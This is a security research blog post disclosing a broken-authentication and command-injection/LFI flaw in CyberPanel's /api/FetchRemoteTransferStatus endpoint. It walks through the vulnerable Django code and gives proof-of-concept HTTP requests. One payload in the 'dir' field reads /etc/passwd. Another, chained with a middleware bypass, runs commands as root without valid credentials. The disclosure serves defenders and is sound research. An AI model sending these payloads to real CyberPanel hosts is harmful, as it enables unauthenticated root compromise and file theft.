---
title:  "[7] CyberPanel - Broken Authentication and Local File Inclusion (LFI) in '/api/FetchRemoteTransferStatus' endpoint"
layout: post
author: Altion
date:   2024-01-22
# last_modified_at: 2024-01-22
permalink: /posts/cyberpanel-7
categories: cyberpanel, security research
---

In CyberPanel versions between 1.7 (possibly earlier) and 2.3.4, the `FetchRemoteTransferStatus()` function used in 'Remote Backups' is missing sufficient authentication controls and is vulenerable to LFI.

<table>
    <tr>
        <th>OWASP Top 10</th>
        <td><a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" target="blank">A07:2021</a> - Identification and Authentication Failures</td>
    </tr>
    <tr>
        <th>CWE ID</th>
        <td><a href="https://cwe.mitre.org/data/definitions/287.html" target="blank">CWE-287</a> - Improper Authentication</td>
    </tr>
    <tr>
        <th>CVSS v4.0 Score</th>
        <td><a href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N" target="blank">Medium (6.9)</a></td>
    </tr>
    <tr>
        <th>Vendor URLs</th>
        <td>
            <a href="https://cyberpanel.net/" target="blank">https://cyberpanel.net/</a>
            <br />
            <a href="https://github.com/usmannasir/cyberpanel" target="blank">https://github.com/usmannasir/cyberpanel</a>
        </td>
    </tr>    
    <tr>
        <th>Affected Versions</th>
        <td>1.7 - 2.3.4</td>
    </tr>
</table>

Adversaries with knowledge of the username of at least one administrative user with enabled API access can leverage this vulnerability to make unauthenticated HTTP POST calls to the `/api/FetchRemoteTransferStatus` API endpoint. These unauthenticated calls can reach the execution of the `cat` command in the `FetchRemoteTransferStatus` view function and can allow for limited LFI attacks.

Injecting payloads such as `testfolder /etc/passwd #` in the JSON `dir` parameter will cause the `cat` command to print the contents of the `/etc/passwd` file, however this data is not returned in the HTTP response, unless the request is authenticated.

Attackers can also exploit this vulnerability to cause denial-of-service (DoS) by making multiple unauthenticated HTTP POST calls to include large local files in an attempt to exhaust the available system resources.

Combining this vulnerability with the [Security Middleware Bypass](/weblog{% post_url 2024-01-22-cyberpanel-4 %}), it is possible to gain root access on the underlying CyberPanel host. This approach is described below after the technical analysis.

#### Technical Analysis

Remote Backups (a.k.a. Remote Transfer), accessible through `Main -> Back up -> Remote Back ups`, is a functionality that can be used by administrative users to import websites from a remote CyberPanel instance. Using the hostname or IP address and the 'admin' user's password of the remote CyberPanel instance, administrators can list and transfer one or more of the available websites from the remote CyberPanel instance.

Once the remote transfer process has started, the remote CyberPanel instance will first make a local backup archive of the website(s). During this process, the local CyberPanel application will issue several HTTP POST requests to the '/backup/getRemoteTransferStatus' endpoint to retrieve the backup and transfer progress from the remote CyberPanel instance. When remote backup is complete, the backup files are transferred locally and the websites are imported on the local CyberPanel instance.

The following code snippets highlight the implementation details of the `/backup/getRemoteTransferStatus` endpoint. Initially, this endpoint handles HTTP calls using the `getRemoteTransferStatus()` view function (line 51):

```python
# File: backup/urls.py
...
File: backup/urls.py
04: urlpatterns = [
...
49:     url(r'^remoteBackups', views.remoteBackups, name='remoteBackups'),
50:     url(r'^submitRemoteBackups', views.submitRemoteBackups, name='submitRemoteBackups'),
51:     url(r'^getRemoteTransferStatus', views.getRemoteTransferStatus, name='getRemoteTransferStatus'),
...
```

The BackupManager's own `getRemoteTransferStatus()` function is called, shown below on line 363:

```python
# File: backup/views.py
...
9: from backup.backupManager import BackupManager
...
359: def getRemoteTransferStatus(request):
360:     try:
361:         userID = request.session['userID']
362:         wm = BackupManager()
363:         return wm.getRemoteTransferStatus(userID, json.loads(request.body))
364:     except KeyError:
365:         return redirect(loadLoginPage)
...
```

The `getRemoteTransferStatus()` function of `BackupManager` uses the provided information (lines 1220-1222) to retrieve the remote transfer status by making an HTTP POST request to the '/api/FetchRemoteTransferStatus' API endpoint of the remote CyberPanel instance (lines 1225-1227).

The provided information includes the hostname or IP address, administrative password, and directory name where the backup logs `backup_log` file is located on the remote CyberPanel instance:

```python
# File: backup/backupManager.py
...
1213:     def getRemoteTransferStatus(self, userID=None, data=None):
1214:         try:
1215:             currentACL = ACLManager.loadedACL(userID)
1216: 
1217:             if ACLManager.currentContextPermission(currentACL, 'remoteBackups') == 0:
1218:                 return ACLManager.loadErrorJson('remoteTransferStatus', 0)
1219: 
1220:             ipAddress = data['ipAddress']
1221:             password = data['password']
1222:             dir = data['dir']
1223:             username = "admin"
1224: 
1225:             finalData = json.dumps({'dir': dir, "username": username, "password": password})
1226:             r = requests.post("https://" + ipAddress + ":8090/api/FetchRemoteTransferStatus", data=finalData,
1227:                               verify=False)
1228: 
1229:             data = json.loads(r.text)
1230: 
1231:             if data['fetchStatus'] == 1:
1232:                 if data['status'].find("Backups are successfully generated and received on") > -1:
1233: 
1234:                     data = {'remoteTransferStatus': 1, 'error_message': "None", "status": data['status'],
1235:                             'backupsSent': 1}
1236:                     json_data = json.dumps(data)
1237:                     return HttpResponse(json_data)
...
```

The `/api/FetchRemoteTransferStatus` API endpoint handles HTTP POST requests by calling the `FetchRemoteTransferStatus()` view function (line 24):

```python
# File: api/urls.py
01: from django.conf.urls import url
02: from . import views
03: 
04: urlpatterns = [
...
24:     url(r'^FetchRemoteTransferStatus', views.FetchRemoteTransferStatus, name='FetchRemoteTransferStatus'), # 7
...
```

The `FetchRemoteTransferStatus()` view function, which in this case is executed in the context of the remote CyberPanel instance, starts by checking if API access is enabled for the provided administrative user (lines 519-524).

If API access is enabled, the Linux `cat` utility is used to print the contents of the `backup_log` file located in the directory path constructed using the user-supplied `dir` paramater value (lines 526-530).

As a result, the contents of `backup_log` file are printed on the 'Remote Backups' web page displaying the status of the remote backup and transfer process:

```python
# File: api/views.py
...
511: @csrf_exempt
512: def FetchRemoteTransferStatus(request):
513:     try:
514:         if request.method == "POST":
515:             data = json.loads(request.body)
516:             username = data['username']
517:             password = data['password']
518: 
519:             admin = Administrator.objects.get(userName=username)
520: 
521:             if admin.api == 0:
522:                 data_ret = {"fetchStatus": 0, 'error_message': "API Access Disabled."}
523:                 json_data = json.dumps(data_ret)
524:                 return HttpResponse(json_data)
525: 
526:             dir = "/home/backup/transfer-"+str(data['dir'])+"/backup_log"
527: 
528:             try:
529:                 command = f"cat {dir}"
530:                 status = ProcessUtilities.outputExecutioner(command)
531: 
532:                 if hashPassword.check_password(admin.password, password):
533: 
534:                     final_json = json.dumps({'fetchStatus': 1, 'error_message': "None", "status": status})
535:                     return HttpResponse(final_json)
536:                 else:
537:                     data_ret = {'fetchStatus': 0, 'error_message': "Invalid Credentials"}
538:                     json_data = json.dumps(data_ret)
539:                     return HttpResponse(json_data)
540:             except:
541:                 final_json = json.dumps({'fetchStatus': 1, 'error_message': "None", "status": "Just started.."})
542:                 return HttpResponse(final_json)
...
```

Examination of the `FetchRemoteTransferStatus()` view function implementation revealed that the authentication check is performed after the execution of the Linux `cat` command (lines 532-535).

Specifically, regardless of whether the provided administrative user password is valid, the backend API will always execute the Linux `cat` command using the user-provided input in the JSON `dir` parameter. 

As proof of concept, the following unauthenticated HTTP POST request attempts to directly call the `/api/FetchRemoteTransferStatus` API endpoint to retrieve the remote transfer status using the `testfolder` directory name:

```http
POST /api/FetchRemoteTransferStatus HTTP/1.1
Host: cyberpanel:8090
Content-Length: 83
...
Content-Type: application/json

{
    "username": "admin",
    "password": "INVALID_PASSWORD",
    "dir": "testfolder"
}
```

It should be noted that the username of any administrative user with enabled API access can be used in this attack. As a result, the backend API responds with the 'Invalid Credentials' error message since the provided password was invalid:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Language: en
Content-Length: 58
Server: LiteSpeed
Connection: Keep-Alive
[...]

{
    "fetchStatus": 0,
    "error_message": "Invalid Credentials"
}
```

However, as shown below, the `cat` command was executed successfully using the user-supplied `testfolder` input:

```console
$ ./pspy64
... 21:32:51 CMD: UID=0    PID=14057  | lscpd (CommSocket) 
... 21:32:51 CMD: UID=0    PID=14056  | lscpd (CommSocket) 
... 21:32:51 CMD: UID=0    PID=14058  | sh -c sudo cat /home/backup/transfer-testfolder/backup_log 
... 21:32:51 CMD: UID=0    PID=14059  | sudo cat /home/backup/transfer-testfolder/backup_log
```

#### Something, something, unrestricted authenticated LFI

The following authenticated HTTP POST request attempts to directly call the `/api/FetchRemoteTransferStatus` API endpoint to print the contents of the `/etc/passwd` system file:

```http
POST /api/FetchRemoteTransferStatus HTTP/1.1
Host: cyberpanel:8090
Content-Length: 97
...
Content-Type: application/json

{
    "username": "admin",
    "password": "1*****7",
    "dir": "testfolder /etc/passwd #"
}
```

It should be noted that the username and password credentials of any administrative user with enabled API access can be used in this attack. In return, the backend API responds with the contents of the `/etc/passwd` file:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Language: en
Content-Length: 2689
Server: LiteSpeed
Connection: Keep-Alive
[...]

{
    "fetchStatus": 1,
    "error_message": "None",
    "status": "cat: /home/backup/transfer-testfolder: No such file or directory\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin[...]redis:x:119:125::/var/lib/redis:/usr/sbin/nologin\n"
}
```

#### Combine, reverse backflip, and next thing you know you're root


It is also possible to leverage the limited LFI, which in reality is a restricted command injection, to achieve full compromise of the underlying CyberPanel host. This can be achieved combining this issue with the vulnerability presented in [Security Middleware Bypass](/weblog{% post_url 2024-01-22-cyberpanel-4 %}).

In effect, with this combination, the following request becomes immune to the command injection checks:

```http
POST /api/FetchRemoteTransferStatus?verifyLogin HTTP/1.1
Host: cyberpanel.local:8090
Content-Length: 114
Content-Type: application/json

{
    "username": "admin",
    "password": "INVALID_PASSWORD",
    "dir": "testfolder; whoami > /tmp/test #"
}
```

This will inject another command that will print the user running the command and output that to the `test` file in `/tmp`. Et voila, of course it was running as root.


```console
user@cyberpanel:~$ ls /tmp/
-rw-r--r--  1 root   lscpd       5 Jan 21 22:31 test
user@cyberpanel:~$ cat /tmp/test 
root
```

This means that it is possible to go from unauthenticated to root with minimal attack complexity.

There are so many things wrong here, command injection, missing authentication and most importantly, running the whole thing with root privileges.

You might be wondering why this vulnerability hasn't been rated as critical. Well, I could mark this as critical, but without the secondary issue that bypassed the command injection checks, this issue is very limited on itself. As a result, the presented score is against the bug in itself, without the other issues which can be combined to result in something more severe.